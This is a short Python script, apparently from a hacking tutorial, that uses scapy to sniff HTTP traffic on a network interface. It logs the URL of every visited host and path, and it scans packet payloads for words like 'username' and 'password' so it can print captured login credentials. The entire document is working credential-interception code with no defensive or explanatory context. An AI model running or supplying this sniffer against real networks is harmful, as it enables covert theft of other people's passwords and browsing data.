#!usr/bin/env python
import scapy.all as scapy
from scapy_http import http

def yourInfo(interface):
  scapy.sniff(iface=interface, store=False, prn=packetInfo)

def urlVisited(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def yourLoginDetails(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        loginKeywords = ["username", 'uname', 'user', 'name', 'password', 'pass', 'login']
        for keyword in loginKeywords:
            if keyword in load:
                return load

def packetInfo(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] visited URL >>> "+urlVisited(packet))
        loginDetails = yourLoginDetails(packet)
        if loginDetails:
            print("\n\n[+] Possible login credentials -->>"+yourLoginDetails(packet) + "\n\n")

yourInfo("NETWORK_INTERFACE")